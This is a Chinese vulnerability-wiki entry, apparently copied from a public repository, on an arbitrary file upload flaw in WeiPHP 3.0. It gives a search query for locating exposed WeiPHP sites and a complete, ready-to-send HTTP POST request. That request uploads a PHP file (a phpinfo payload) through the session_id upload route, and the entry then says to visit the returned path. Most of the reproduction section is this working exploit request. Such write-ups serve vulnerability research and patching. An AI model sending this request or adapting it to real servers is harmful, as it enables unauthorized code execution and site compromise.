---
title: "WeiPHP3.0 session_id 任意文件上传漏洞"
date: 2026-10-12 09:01:03
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "WeiPHP"
tags:
  - "WeiPHP"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

WeiPHP3.0 session_id 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件

## 漏洞影响

```
WeiPHP3.0
```

## 网络测绘

```
app="weiphp"
```

## 漏洞复现

登陆页面标识

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162318569.png)

发送请求包上传文件

```php
POST /index.php?s=%2FHome%2FFile%2Fupload%2Fsession_id%2Fscevs8hub3m5ogla05a421hb42.html HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 831
Content-Type: multipart/form-data; boundary=------------------------e37a54d7d5380c9f
Accept-Encoding: gzip

--------------------------e37a54d7d5380c9f
Content-Disposition: form-data; name="download"; filename="882176.php"
Content-Type: application/octet-stream

<?php
phpinfo();

--------------------------e37a54d7d5380c9f--
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162318518.png)

获取目录后访问回显的 path

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162318407.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/WeiPHP3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
